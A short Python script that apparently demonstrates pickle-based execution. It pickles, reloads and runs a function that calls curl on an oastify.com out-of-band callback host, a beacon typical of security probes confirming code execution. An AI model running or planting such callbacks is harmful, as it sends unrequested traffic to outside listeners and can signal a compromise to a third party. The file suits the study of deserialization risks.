import subprocess
import pickle

def run_curl():
    result = subprocess.run(['curl', '69dmaolwtz98yx3xd41xxcy7xy3prff4.oastify.com'], capture_output=True, text=True)
    return result.stdout

# Pickle the function
with open('run_curl.pkl', 'wb') as f:
    pickle.dump(run_curl, f)

# Load the pickled function
with open('run_curl.pkl', 'rb') as f:
    loaded_function = pickle.load(f)

# Execute the loaded function
output = loaded_function()
print(output)
